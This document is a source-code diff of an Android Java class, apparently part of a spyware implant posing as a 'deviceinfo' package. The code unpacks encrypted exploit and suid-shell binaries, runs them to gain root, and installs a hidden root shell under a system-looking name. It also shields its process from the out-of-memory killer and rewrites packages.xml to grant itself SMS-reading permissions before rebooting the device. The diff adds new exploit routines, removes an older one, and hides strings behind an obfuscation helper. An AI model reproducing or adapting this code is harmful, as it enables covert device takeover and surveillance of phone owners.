@@ -23,7 +23,6 @@ import javax.crypto.spec.IvParameterSpec;
 
 import android.content.Context;
 import android.content.pm.PackageManager;
-import android.content.res.Resources;
 import android.widget.Toast;
 
 import com.android.deviceinfo.auto.Cfg;
@@ -35,6 +34,7 @@ import com.android.deviceinfo.util.Execute;
 import com.android.deviceinfo.util.ExecuteResult;
 import com.android.deviceinfo.util.StringUtils;
 import com.android.deviceinfo.util.Utils;
+import com.android.m.M;
 
 public class Root {
 	private static final String TAG = "Root";
@@ -65,11 +65,11 @@ public class Root {
 		// 32_35=/system/bin/ntpsvd qzx \"echo '-1000' >
 		// /proc/
 		// 32_36=/oom_score_adj\"
-		String script = Messages.getString("32_34") + "\n" + Messages.getString("32_35") + pid
-				+ Messages.getString("32_36") + "\n";
+		String script = M.e("#!/system/bin/sh") + "\n" + M.e("/system/bin/rilcap qzx \"echo '-1000' > /proc/") + pid
+				+ M.e("/oom_score_adj\"") + "\n";
 		// 32_37=/system/bin/ntpsvd qzx \"echo '-17' > /proc/
 		// 32_38=/oom_adj\"
-		script += Messages.getString("32_37") + pid + Messages.getString("32_38") + "\n";
+		script += M.e("/system/bin/rilcap qzx \"echo '-17' > /proc/") + pid + M.e("/oom_adj\"") + "\n";
 
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (adjustOom): script: " + script); //$NON-NLS-1$
@@ -105,9 +105,9 @@ public class Root {
 		// 32_34=#!/system/bin/sh
 
 		String packageName = Status.self().getAppContext().getPackageName();
-		String script = Messages.getString("32_34") + "\n";
+		String script = M.e("#!/system/bin/sh") + "\n";
 		script += "/system/bin/rilcap ru\n";
-		script += "LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall " + packageName +"\n";
+		script += "LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall " + packageName + "\n";
 
 		String filename = "c";
 		if (createScript(filename, script) == false) {
@@ -121,7 +121,8 @@ public class Root {
 		Execute ex = new Execute();
 		ExecuteResult result = ex.executeRoot(Status.getAppContext().getFilesDir() + "/" + filename);
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (uninstallRoot) result stdout: %s stderr: %s", StringUtils.join(result.stdout), StringUtils.join(result.stderr));
+			Check.log(TAG + " (uninstallRoot) result stdout: %s stderr: %s", StringUtils.join(result.stdout),
+					StringUtils.join(result.stderr));
 		}
 
 		removeScript(filename);
@@ -137,7 +138,7 @@ public class Root {
 	static public void superapkRoot() {
 		final File filesPath = Status.getAppContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
-		final String suidext = Messages.getString("32_6"); // sdb
+		final String suidext = M.e("statusdb"); // sdb
 
 		if (Status.haveSu() == false) {
 			return;
@@ -150,35 +151,38 @@ public class Root {
 		InputStream stream = Utils.getAssetStream("s.bin");
 
 		try {
-			// 0x5A3D10448D7A912A
 			fileWrite(suidext, stream, Cfg.RNDDB);
-
+			String pack = Status.self().getAppContext().getPackageName();
 			// Proviamoci ad installare la nostra shell root
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (superapkRoot): " + "chmod 755 " + path + "/" + suidext); //$NON-NLS-1$
-				Check.log(TAG + " (superapkRoot): " + Messages.getString("32_31")); //$NON-NLS-1$
+
+				Check.log(TAG + " (superapkRoot): " + String.format(M.e("su -c /data/data/%s/files/s"), pack)); //$NON-NLS-1$
 			}
 
-			Runtime.getRuntime().exec(Messages.getString("32_7") + path + "/" + suidext);
+			Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + path + "/" + suidext);
 
 			// 32.29 = /data/data/com.android.service/files/statusdb rt
 			// 32_34=#!/system/bin/sh\n
-			String script = Messages.getString("32_34") + "\n" + Messages.getString("32_29") + "\n";
+			String script = M.e("#!/system/bin/sh") + "\n"
+					+ String.format(M.e("/data/data/%s/files/statusdb rt"), pack) + "\n";
 
 			if (Root.createScript("s", script) == true) {
 				// 32_7=/system/bin/chmod 755
-				Process runScript = Runtime.getRuntime().exec(Messages.getString("32_7") + path + "/s");
+				Process runScript = Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + path + "/s");
 				int ret = runScript.waitFor();
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (superapkRoot) execute 1: " + Messages.getString("32_7") + path + "/s" + " ret: "
-							+ ret);
+					Check.log(TAG + " (superapkRoot) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/s"
+							+ " ret: " + ret);
 				}
 
 				// su -c /data/data/com.android.service/files/s
-				Process localProcess = Runtime.getRuntime().exec(Messages.getString("32_31"));
+				Process localProcess = Runtime.getRuntime().exec(
+						String.format(M.e("su -c /data/data/%s/files/s"), pack));
 				ret = localProcess.waitFor();
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (superapkRoot) execute 2: " + Messages.getString("32_31") + " ret: " + ret);
+					Check.log(TAG + " (superapkRoot) execute 2: "
+							+ String.format(M.e("su -c /data/data/%s/files/s"), pack) + " ret: " + ret);
 				}
 
 				Root.removeScript("s");
@@ -204,6 +208,107 @@ public class Root {
 		}
 	}
 
+	static public boolean checkExploitability() {
+		final File filesPath = Status.getAppContext().getFilesDir();
+		final String path = filesPath.getAbsolutePath();
+		final String exploitCheck = M.e("ec"); // ec
+
+		// ec
+		InputStream stream = Utils.getAssetStream("h.bin");
+		
+		try {
+			fileWrite(exploitCheck, stream, Cfg.RNDDB);
+			
+			Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + path + "/" + exploitCheck);
+
+			Process runScript = Runtime.getRuntime().exec(path + M.e("/ec"));
+			runScript.waitFor();
+			
+			int ret = runScript.exitValue();
+			
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (checkExploitability) execute 1: " + M.e("/system/bin/chmod 755 ") + path + "/ec"
+						+ " ret: " + ret);
+			}
+			
+			File file = new File(Status.getAppContext().getFilesDir(), exploitCheck);
+			file.delete();
+			
+			return ret > 0 ? true : false;
+		} catch (final Exception e1) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e1);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(e1);//$NON-NLS-1$
+				Check.log(TAG + " (checkExploitability): Exception"); //$NON-NLS-1$
+			}
+
+			return false;
+		}
+	}
+	
+	static public boolean localExploit() {
+		final File filesPath = Status.getAppContext().getFilesDir();
+		final String path = filesPath.getAbsolutePath();
+		final String localExploit = M.e("l"); // local_exploit
+
+		// l
+		InputStream stream = Utils.getAssetStream("l.bin");
+		
+		try {
+			fileWrite(localExploit, stream, Cfg.RNDDB);
+			
+			Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + path + "/" + localExploit);
+			
+			// Unpack the suid shell
+			final String suidShell = M.e("ss"); // suid shell
+			InputStream shellStream = Utils.getAssetStream("s.bin");
+
+			fileWrite(suidShell, shellStream, Cfg.RNDDB);
+			
+			Runtime.getRuntime().exec(M.e("/system/bin/chmod 755 ") + path + "/" + suidShell);
+
+			// Create the rooting script
+			String pack = Status.self().getAppContext().getPackageName();
+			
+			String script = M.e("#!/system/bin/sh") + "\n"
+					+ String.format(M.e("/data/data/%s/files/l /data/data/%s/files/ss rt"), pack, pack) + "\n";
+
+			if (Root.createScript("les", script) == true) {
+				Process runScript = Runtime.getRuntime().exec(path + "/les");
+				
+				runScript.waitFor();
+				
+				Root.removeScript("les");
+			} else {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " ERROR: (localExploit), cannot create script");
+				}
+			}
+			
+			File file = new File(Status.getAppContext().getFilesDir(), localExploit);
+			file.delete();
+			
+			file = new File(Status.getAppContext().getFilesDir(), suidShell);
+			file.delete();
+
+			return true;
+		} catch (final Exception e1) {
+			if (Cfg.EXCEPTION) {
+				Check.log(e1);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(e1);//$NON-NLS-1$
+				Check.log(TAG + " (localExploit): Exception"); //$NON-NLS-1$
+			}
+
+			return false;
+		}
+	}
+	
 	// name WITHOUT path (script is generated inside /data/data/<package>/files/
 	// directory)
 	static public boolean createScript(String name, String script) {
@@ -221,7 +326,7 @@ public class Root {
 
 			return true;
 		} catch (Exception e) {
-			if (Cfg.EXP) {
+			if (Cfg.EXCEPTION) {
 				Check.log(e);
 			}
 
@@ -244,7 +349,7 @@ public class Root {
 
 			return true;
 		} catch (Exception e) {
-			if (Cfg.EXP) {
+			if (Cfg.EXCEPTION) {
 				Check.log(e);
 			}
 
@@ -267,7 +372,7 @@ public class Root {
 		}
 	}
 
-	public void getPermissions() {
+	static public void getPermissions() {
 		// Abbiamo su?
 		Status.setSu(PackageInfo.hasSu());
 
@@ -299,6 +404,10 @@ public class Root {
 
 		// Avoid having the process killed for using too many resources
 		Root.adjustOom();
+	}
+	
+	static public boolean isRootShellInstalled() {
+		return PackageInfo.checkRoot();
 	}
 
 	static public boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
@@ -345,7 +454,7 @@ public class Root {
 		}
 
 		// 17.4=AES/CBC/PKCS5Padding
-		Cipher cipher = Cipher.getInstance(Messages.getString("17_4")); //$NON-NLS-1$
+		Cipher cipher = Cipher.getInstance(M.e("AES/CBC/PKCS5Padding")); //$NON-NLS-1$
 		final byte[] iv = new byte[16];
 		Arrays.fill(iv, (byte) 0);
 		IvParameterSpec ivSpec = new IvParameterSpec(iv);
@@ -360,117 +469,6 @@ public class Root {
 		return cis;
 	}
 
-	static public boolean root() {
-		try {
-			if (!Cfg.EXP) {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (root): Exploit disabled by conf"); //$NON-NLS-1$
-				}
-
-				return false;
-			}
-
-			final String crashlog = Messages.getString("32_4"); //$NON-NLS-1$
-			final String exploit = Messages.getString("32_5"); //$NON-NLS-1$
-			final String suidext = Messages.getString("32_6"); //$NON-NLS-1$
-			boolean isRoot = false;
-
-			// Creiamo il crashlog
-			final FileOutputStream fos = Status.getAppContext().openFileOutput(crashlog, Context.MODE_PRIVATE);
-			fos.close();
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (root): saving statuslog"); //$NON-NLS-1$
-			}
-
-			// exploit
-			InputStream stream = Utils.getAssetStream("e.bin");
-
-			// "0x5A3D10448D7A912B"
-			Root.fileWrite(exploit, stream, Cfg.RNDLOG);
-
-			if (Cfg.DEBUG) {
-				Check.log(TAG + " (root): saving exploit e.bin"); //$NON-NLS-1$
-			}
-
-			// shell
-			stream = Utils.getAssetStream("s.bin");
-
-			// 0x5A3D10448D7A912A
-			Root.fileWrite(suidext, stream, Cfg.RNDDB);
-
-			// Eseguiamo l'exploit
-			final File filesPath = Status.getAppContext().getFilesDir();
-			final String path = filesPath.getAbsolutePath();
-
-			Runtime.getRuntime().exec(Messages.getString("32_7") + path + "/" + exploit); //$NON-NLS-1$ //$NON-NLS-2$
-			Runtime.getRuntime().exec(Messages.getString("32_8") + path + "/" + suidext); //$NON-NLS-1$ //$NON-NLS-2$
-			Runtime.getRuntime().exec(Messages.getString("32_9") + path + "/" + crashlog); //$NON-NLS-1$ //$NON-NLS-2$
-
-			String exppath = path + "/" + exploit; //$NON-NLS-1$
-
-			ExploitRunnable r = new ExploitRunnable(exppath);
-			Thread t = new Thread(r);
-			if (Cfg.DEBUG) {
-				t.setName(r.getClass().getSimpleName());
-			}
-			t.start();
-
-			// Attendiamo al max 100 secondi il nostro file setuid root
-			final long now = System.currentTimeMillis();
-
-			while (System.currentTimeMillis() - now < 100 * 1000) {
-				Utils.sleep(1000);
-
-				if (PackageInfo.checkRoot()) {
-					isRoot = true;
-					break;
-				}
-			}
-
-			if (r.getProcess() != null) {
-				r.getProcess().destroy();
-			}
-
-			if (isRoot) {
-				// Di' a suidext di fare il kill di VOLD per due volte
-				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32_10")); //$NON-NLS-1$ //$NON-NLS-2$
-
-				// Copia la shell root, ovvero il suidext, in /system/bin/ntpsvd
-				Runtime.getRuntime().exec(path + "/" + suidext + Messages.getString("32_11")); //$NON-NLS-1$ //$NON-NLS-2$
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onStart): Root exploit"); //$NON-NLS-1$
-				}
-
-				// Riavviamo il telefono
-				Runtime.getRuntime().exec(path + "/" + suidext + " reb"); //$NON-NLS-1$ //$NON-NLS-2$
-			} else {
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (onStart): exploit failed!"); //$NON-NLS-1$
-				}
-			}
-
-			return isRoot;
-
-		} catch (final Exception e1) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e1);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(e1);//$NON-NLS-1$
-				Check.log(TAG + " (root): Exception on root()"); //$NON-NLS-1$
-			}
-
-			return false;
-		}
-	}
-
-	// TODO: rimuovere lo string-fu, cifrare le stringhe, cifrare
-	// le stringe nella librunner.so. Fixare il fatto che l'app va
-	// in crash se la funzione torna 0 o 1 e si ferma il servizio
-
 	/*
 	 * Verifica e prova ad ottenere le necessarie capabilities
 	 * 
@@ -478,14 +476,14 @@ public class Root {
 	 * e' in attesa di un reboot 2 se gia' abbiamo le cap necessarie
 	 */
 	public static int overridePermissions() {
-		final String manifest = Messages.getString("32_15"); //$NON-NLS-1$ 
+		final String manifest = M.e("layout"); //$NON-NLS-1$ 
 
 		// Controlliamo se abbiamo le capabilities necessarie
 		PackageManager pkg = Status.getAppContext().getPackageManager();
 
 		if (pkg != null) {
 			// android.permission.READ_SMS, com.android.service
-			int perm = pkg.checkPermission(Messages.getString("32_16"), Messages.getString("32_17"));
+			int perm = pkg.checkPermission(M.e("android.permission.READ_SMS"), M.e("$PACK$"));
 
 			if (perm == PackageManager.PERMISSION_GRANTED) {
 				return 2;
@@ -495,6 +493,8 @@ public class Root {
 		try {
 			Execute ex = new Execute();
 
+			String pack = Status.self().getAppContext().getPackageName();
+			
 			// Runtime.getRuntime().exec("/system/bin/ntpsvd fhc /data/system/packages.xml /data/data/com.android.service/files/packages.xml");
 			// Creiamo la directory files
 			Status.getAppContext().openFileOutput("test", Context.MODE_WORLD_READABLE);
@@ -502,15 +502,15 @@ public class Root {
 			// Copiamo packages.xml nel nostro path e rendiamolo scrivibile
 			// /system/bin/ntpsvd fhc /data/system/packages.xml
 			// /data/data/com.android.service/files/packages.xml
-			ex.execute(Messages.getString("32_18"));
+			ex.execute(String.format(M.e("/system/bin/rilcap fhc /data/system/packages.xml /data/data/%s/files/packages.xml"), pack));
 			Utils.sleep(600);
 			// /system/bin/ntpsvd pzm 666
 			// /data/data/com.android.service/files/packages.xml
-			ex.execute(Messages.getString("32_19"));
+			ex.execute(String.format(M.e("/system/bin/rilcap pzm 666 /data/data/%s/files/packages.xml"), pack));
 
 			// Rimuoviamo il file temporaneo
 			// /data/data/com.android.service/files/test
-			File tmp = new File(Messages.getString("32_20"));
+			File tmp = new File(String.format(M.e("/data/data/%s/files/test"), pack));
 
 			if (tmp.exists() == true) {
 				tmp.delete();
@@ -518,7 +518,7 @@ public class Root {
 
 			// Aggiorniamo il file
 			// packages.xml
-			FileInputStream fin = Status.getAppContext().openFileInput(Messages.getString("32_21"));
+			FileInputStream fin = Status.getAppContext().openFileInput(M.e("packages.xml"));
 			// com.android.service
 			PackageInfo pi = new PackageInfo(fin, Status.getAppContext().getPackageName());
 
@@ -527,7 +527,8 @@ public class Root {
 			if (path.length() == 0) {
 				return 0;
 			}
-
+			
+			
 			// Vediamo se gia' ci sono i permessi richiesti
 			if (pi.checkRequiredPermission() == true) {
 				if (Cfg.DEBUG) {
@@ -536,7 +537,7 @@ public class Root {
 
 				// Rimuoviamo la nostra copia
 				// /data/data/com.android.service/files/packages.xml
-				File f = new File(Messages.getString("32_22"));
+				File f = new File(String.format(M.e("/data/data/%s/files/packages.xml"),pack));
 
 				if (f.exists() == true) {
 					f.delete();
@@ -546,8 +547,8 @@ public class Root {
 			}
 
 			// perm.xml
-			pi.addRequiredPermissions(Messages.getString("32_23"));
-
+			pi.addRequiredPermissions(M.e("perm.xml"));
+			
 			// .apk con tutti i permessi nel manifest
 
 			// TODO riabilitare le righe quando si reinserira' l'exploit
@@ -559,16 +560,16 @@ public class Root {
 			// Copiamolo in /data/app/*.apk
 			// /system/bin/ntpsvd qzx \"cat
 			// /data/data/com.android.service/files/layout >
-			ex.execute(Messages.getString("32_24") + path + "\"");
+			ex.execute(String.format(M.e("/system/bin/rilcap qzx \"cat /data/data/%s/files/layout > "),pack) + path + "\"");
 
 			// Copiamolo in /data/system/packages.xml
 			// /system/bin/ntpsvd qzx
 			// \"cat /data/data/com.android.service/files/perm.xml > /data/system/packages.xml\""
-			ex.execute(Messages.getString("32_25"));
+			ex.execute(String.format(M.e("/system/bin/rilcap qzx \"cat /data/data/%s/files/perm.xml > /data/system/packages.xml\""),pack));
 
 			// Rimuoviamo la nostra copia
 			// /data/data/com.android.service/files/packages.xml
-			File f = new File(Messages.getString("32_22"));
+			File f = new File(String.format(M.e("/data/data/%s/files/packages.xml"),pack));
 
 			if (f.exists() == true) {
 				f.delete();
@@ -576,7 +577,7 @@ public class Root {
 
 			// Rimuoviamo il file temporaneo
 			// /data/data/com.android.service/files/perm.xml
-			f = new File(Messages.getString("32_26"));
+			f = new File(String.format(M.e("/data/data/%s/files/perm.xml"),pack));
 
 			if (f.exists() == true) {
 				f.delete();
@@ -584,7 +585,7 @@ public class Root {
 
 			// Rimuoviamo l'apk con tutti i permessi
 			// /data/data/com.android.service/files/layout
-			f = new File(Messages.getString("32_27"));
+			f = new File(String.format(M.e("/data/data/%s/files/layout"),pack));
 
 			if (f.exists() == true) {
 				f.delete();
@@ -592,7 +593,7 @@ public class Root {
 
 			// Riavviamo il telefono
 			// /system/bin/ntpsvd reb
-			ex.execute(Messages.getString("32_28"));
+			ex.execute(M.e("/system/bin/rilcap reb"));
 		} catch (Exception e1) {
 			if (Cfg.EXCEPTION) {
 				Check.log(e1);
@@ -609,7 +610,7 @@ public class Root {
 		return 1;
 	}
 
-	public void runGingerBreak() {
+	static public void runGingerBreak() {
 		boolean isRoot = Status.haveRoot();
 
 		if (isRoot == false) {
